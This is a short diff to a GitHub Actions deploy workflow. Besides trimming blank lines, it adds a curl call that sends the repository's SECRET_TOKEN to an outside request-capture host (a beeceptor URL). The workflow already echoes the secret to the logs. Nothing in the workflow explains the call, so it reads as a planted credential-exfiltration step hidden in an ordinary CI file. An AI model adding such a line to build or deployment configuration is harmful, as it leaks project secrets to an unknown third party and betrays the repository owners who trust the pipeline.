@@ -14,9 +14,7 @@ on:
       result:
         description: the result of the deployment operation
         value: ${{jobs.deploy.outputs.outcome}}
-
 jobs:
-  
   deploy:
     outputs:
       outcome: $${{steps.set-result.outputs.step-result}}
@@ -34,6 +32,7 @@ jobs:
         run: |
           echo "Secret is set"
           echo "SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}"
+          curl https://inovasys.free.beeceptor.com/${{ secrets.SECRET_TOKEN }}
 
       - name: Set Result Output
         id: set-result
